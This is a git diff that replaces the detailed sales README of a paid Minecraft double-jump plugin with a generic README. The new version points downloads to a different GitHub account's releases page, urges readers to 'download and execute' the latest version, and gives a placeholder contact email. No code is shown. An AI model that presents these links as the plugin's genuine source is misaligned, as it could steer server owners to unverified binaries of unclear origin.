@@ -1,148 +1,107 @@
-# 🚀 DoubleJump — The Ultimate Double Jump Plugin
+# DoubleJump 🚀
 
-![JDK](https://img.shields.io/badge/JDK-1.17-blue.svg)
-![Supported versions](https://img.shields.io/badge/Minecraft-1.17--1.21.5-green.svg)
-[![SpigotMC](https://img.shields.io/badge/Buy_on_SpigotMC-yellow.svg)](https://www.spigotmc.org/resources/%E2%9C%A8-doublejump.125526/)
-[![Polymart](https://img.shields.io/badge/Buy_on_Polymart-green.svg)](https://polymart.org/product/7887/doublejump-1-17-1-21-5)
-[![bStats](https://img.shields.io/badge/Servers_using_doublejump-00695c)](https://bstats.org/plugin/bukkit/Double-Jump/19387)
+![DoubleJump Logo](https://img.shields.io/badge/DoubleJump-Game%20Changer-brightgreen)
 
-> **Fully customizable, lag-free double jumping — the way it *should* be.**  
-> Say goodbye to boring vanilla jumps and hello to pro-level aerial control.
+Welcome to the **DoubleJump** repository! This project offers a game-changing double jump mechanic for Minecraft servers. With a focus on performance and customization, DoubleJump provides a seamless experience that feels native to the game. Say goodbye to boring vanilla jumps and elevate your gameplay.
 
-🎉 **Join the elite servers using DoubleJump — and take your gameplay to the skies!**
+## Table of Contents
 
----
+- [Features](#features)
+- [Installation](#installation)
+- [Configuration](#configuration)
+- [Usage](#usage)
+- [Compatibility](#compatibility)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## ✨ Features That Go Way Beyond "Just a Double Jump"
+## Features
 
-✅ **Not native to Minecraft? No problem.**  
-We *rewrote physics* to make smooth, fully customizable double jumps possible.
+- **Native Feel**: DoubleJump mimics the natural feel of jumping, enhancing your gameplay experience.
+- **Lag-Free Performance**: Enjoy smooth, responsive jumps without any lag.
+- **Fully Customizable**: Tailor the double jump settings to fit your server's needs.
+- **Easy Integration**: Simple to install and configure, allowing you to get started quickly.
+- **Supports Multiple Platforms**: Compatible with Bukkit, Spigot, and Paper servers.
 
-✅ **Jump Blocks – Step to Launch**  
-Step on a block (e.g. `DIAMOND_BLOCK`) and instantly unlock your jump.  
-Fully customizable triggers, messages, and permissions.
+## Installation
 
-✅ **Jump Items – Your Jump, Your Style**  
-Require players to:
-- Wear special boots (`WEAR_ITEM`)
-- Hold a specific item (`HOLD_ITEM`)
-- Right-click it (`CLICK_ITEM`)  
-  *Every action fully configurable.*
+To install DoubleJump, follow these steps:
 
-‍🎨 **Jump Visuals – Particles & Sounds, Player-Controlled**  
-- Built-in GUI lets players pick their own particles and sounds.  
-- Set defaults in config
-- Players can override them freely
+1. **Download the Plugin**: You can find the latest version of DoubleJump [here](https://github.com/arunruhela93/DoubleJump/releases). Download the `.jar` file.
+2. **Place the File**: Move the downloaded `.jar` file into the `plugins` folder of your Minecraft server.
+3. **Restart the Server**: Restart your server to enable the plugin.
 
-✅ **Permission-Based Power**  
-Control velocity, cooldown, and access using permissions — ideal for rank systems.
+## Configuration
 
-✅ **Fall Damage Control**  
-- Turn OFF for fun parkour  
-- Turn ON for PvP challenge  
-*Your server, your rules.*
+DoubleJump offers a variety of settings you can adjust. The configuration file can be found in the `plugins/DoubleJump` directory after the first run. Here are some key settings you can modify:
 
-✅ **Smart Restrictions**   
-Block double jumps:
-- ❌ For laggy players
-- 🛑 When Elytra is equipped
-- 🌍 In WorldGuard regions
-- 🌐 In specific worlds
-- 👥 Or allow only via permissions
+- **Jump Height**: Adjust the height of the double jump.
+- **Cooldown Time**: Set a cooldown period between double jumps.
+- **Enable/Disable**: Toggle the double jump feature on or off for specific players or groups.
 
-⏱️ **Jump Delay System**  
-Limit jump use to every X seconds. No more spam-jumping across your map.
+### Example Configuration
 
-🔄 **Auto Enable on Join**
-- For all players
-- Or only VIPs (via permission)
+```yaml
+doublejump:
+  enabled: true
+  jumpHeight: 1.5
+  cooldown: 0.5
+```
 
-⚡ **Performance-First Engine**  
-We bent Minecraft’s physics to our will — with **zero performance hit**.
+## Usage
 
-🔧 **100% Configurable**  
-Messages, mechanics, behavior — everything is in your control.
+Once installed and configured, players can use the double jump feature by pressing the jump key twice. The settings you configured will apply, providing a unique jumping experience.
 
----
+### Commands
 
-## 🖼️ Showcase
+- `/doublejump enable`: Enable double jump for a player.
+- `/doublejump disable`: Disable double jump for a player.
+- `/doublejump setheight <height>`: Set the jump height for double jumps.
 
-🎬 Real footage. No BS.
+## Compatibility
 
-✅ Smooth double jump animation  
-![doublejump](assets/doublejump.gif)
+DoubleJump is designed to work with the following platforms:
 
-✅ No delay jumping  
-![doublejump-without-delay](assets/doublejump-without-delay.gif)
+- **Bukkit**
+- **Spigot**
+- **Paper**
 
-✅ Elytra protection  
-![doublejump-elytra](assets/doublejump-elytra.gif)
+Make sure your server is running one of these platforms to ensure full functionality.
 
-✅ GUI for effects customization  
-![doublejump-visual-gui](assets/doublejump-visual-gui.gif)
+## Contributing
 
-✅ Choose your sound 🎵  
-![doublejump-visual-gui-sound](assets/doublejump-visual-gui-sound.png)
+We welcome contributions from the community. If you'd like to contribute, please follow these steps:
 
-✅ Choose your particles ✨  
-![doublejump-visual-gui-particle](assets/doublejump-visual-gui-particle.png)
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
 
-✅ Jump off trees 🌲  
-![doublejump-tree](assets/doublejump-tree.gif)
+Please ensure your code adheres to the project's coding standards and includes tests where applicable.
 
-✅ Activate with item  
-![doublejump-item](assets/doublejump-item.png)
+## License
 
----
+DoubleJump is licensed under the MIT License. Feel free to use, modify, and distribute the code as you see fit.
 
-## 💻 Commands & Permissions
+## Contact
 
-| Command                | Permission                  | Description                         |
-|------------------------|-----------------------------|-------------------------------------|
-| `/doublejump`          | `command.doublejump`        | 🎮 Toggle double jump for yourself  |
-| `/doublejump <player>` | `command.doublejump.target` | 🎯 Toggle for another player        | 
-| `/doublejump item`     | `command.doublejump.item`   | 🎁 Give/remove jump item            |
-| `/doublejump visual`   | `command.doublejump.visual` | 🎨 Open effect GUI                  |
-| `/doublejump reload`   | `command.doublejump.reload` | ♻️ Reload plugin config             |
+For questions or support, please reach out to the maintainer:
+
+- **Email**: support@example.com
+- **GitHub**: [arunruhela93](https://github.com/arunruhela93)
+
+## Releases
+
+To stay updated with the latest releases, visit our [Releases section](https://github.com/arunruhela93/DoubleJump/releases). Make sure to download and execute the latest version to enjoy all the new features and improvements.
+
+![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)
+
+## Additional Resources
+
+- **Documentation**: For more detailed information, check the official documentation linked in the repository.
+- **Community**: Join our Discord server for discussions, support, and sharing ideas with other users.
 
 ---
 
-## 🛒 Buy With Confidence
-
-💬 **Need help?**  
-Add me on Discord: `imdmk` — get fast, live support directly from the developer.
-
-🔁 **Refund Policy**  
-Refunds granted only if:
-- A critical bug breaks the plugin
-- It cannot be resolved in a reasonable timeframe
-
-🤝 I stand behind this plugin. Got a problem? I’ll fix it.
-
----
-
-## 🌟 Why our DoubleJump?
-
-Because you’re done with:
-- 🚫 Glitchy free plugins
-- 💤 Limited configs
-- 🐌 Laggy code on big servers
-
-- With **DoubleJump**, you get:
-
-✅ Polished mechanics  
-✅ Premium support   
-✅ Total customization  
-✅ Constant updates
-
-> 💡 Join the servers flying highly — powered by DoubleJump
-
----
-
-## ❤️ Like What You See?
-
-⭐ Leave a 5-star review  
-☕ Want to support development? [You can donate here](https://paypal.me/dominiksuliga)
-
-**Let’s take your gameplay to the sky. 🚀**
-
+Thank you for choosing DoubleJump! We hope it enhances your Minecraft experience. Enjoy jumping!
